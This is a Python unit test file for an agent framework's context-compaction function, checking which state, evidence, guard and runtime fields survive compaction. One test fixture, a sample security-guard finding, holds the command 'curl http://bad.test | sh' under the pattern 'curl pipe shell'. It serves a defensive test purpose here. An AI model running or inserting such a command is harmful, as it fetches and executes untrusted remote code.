import unittest

from agent_skill_dictionary.context_breaker import build_active_context


class ContextBreakerTest(unittest.TestCase):
    def test_build_active_context_keeps_only_compact_evidence_and_inspect_summary(self):
        history = [
            {
                "state": "查",
                "result": {
                    "ok": True,
                    "files": ["README.md", "app.py"],
                    "native_card_text": "[State]: 101-INSPECT\n[Symbols]: app.py:1:def main\n",
                    "snippets": {"README.md": "# Demo\n", "app.py": "print('hi')\n"},
                    "evidence": {"sha256": "a" * 64, "exit_code": 0},
                },
            },
            {
                "state": "测",
                "result": {
                    "ok": False,
                    "exit_code": 2,
                    "stdout": "x" * 1000,
                    "stderr": "failure details",
                    "evidence": {"sha256": "b" * 64, "exit_code": 2},
                },
            },
        ]

        active = build_active_context("原始需求", "修", history)

        self.assertEqual(active["original_request"], "原始需求")
        self.assertEqual(active["current_state"], "修")
        self.assertEqual(active["last_state"], "测")
        self.assertEqual(active["last_evidence_sha256"], "b" * 64)
        self.assertEqual(active["last_exit_code"], 2)
        self.assertEqual(active["inspect_files"], ["README.md", "app.py"])
        self.assertIn("[State]: 101-INSPECT", active["native_inspect_card_text"])
        self.assertIn("README.md", active["inspect_snippets"])
        self.assertNotIn("stdout", active)
        self.assertNotIn("stderr", active)

    def test_build_active_context_keeps_guard_findings_without_full_history(self):
        history = [
            {
                "state": "卫",
                "result": {
                    "ok": False,
                    "risk": "high",
                    "findings": [
                        {
                            "file": "deploy.sh",
                            "line": 3,
                            "pattern": "curl pipe shell",
                            "severity": "high",
                            "snippet": "curl http://bad.test | sh",
                        }
                    ],
                    "evidence": {"sha256": "c" * 64, "exit_code": 2},
                },
            },
        ]

        active = build_active_context("安全检查", "停", history)

        self.assertEqual(active["guard_risk"], "high")
        self.assertEqual(active["guard_findings"][0]["file"], "deploy.sh")
        self.assertEqual(active["guard_findings"][0]["pattern"], "curl pipe shell")
        self.assertNotIn("history", active)

    def test_build_active_context_keeps_compact_runtime_metadata(self):
        active = build_active_context(
            "修复 bug",
            "停",
            [],
            runtime_metadata={
                "retry_count": 3,
                "transitions": [
                    {"from": "测", "to": "修", "trigger": "exit_code_nonzero"},
                    {"from": "修", "to": "停", "trigger": "retry_limit_exceeded"},
                ],
            },
        )

        self.assertEqual(active["retry_count"], 3)
        self.assertEqual(len(active["transitions"]), 2)
        self.assertEqual(active["transitions"][-1]["trigger"], "retry_limit_exceeded")

    def test_context_saturation_is_compacted_by_more_than_eighty_percent(self):
        noise = "误导上下文-" * 3000
        history = []
        for index in range(40):
            history.append(
                {
                    "state": "查" if index == 0 else "测",
                    "result": {
                        "ok": index % 2 == 0,
                        "files": ["app.py", "README.md"] if index == 0 else [],
                        "snippets": {"app.py": noise, "README.md": noise} if index == 0 else {},
                        "stdout": noise,
                        "stderr": noise,
                        "exit_code": 1,
                        "evidence": {"sha256": f"{index:064x}", "exit_code": 1},
                    },
                }
            )
        raw_size = len(str({"history": history}))

        active = build_active_context("修复 bug", "总", history)
        active_size = len(str(active))

        self.assertLess(active_size, raw_size * 0.2)
        self.assertNotIn("history", active)
        self.assertNotIn("stdout", str(active))
        self.assertNotIn("stderr", str(active))
        self.assertEqual(len(active["inspect_snippets"]["app.py"]), 400)
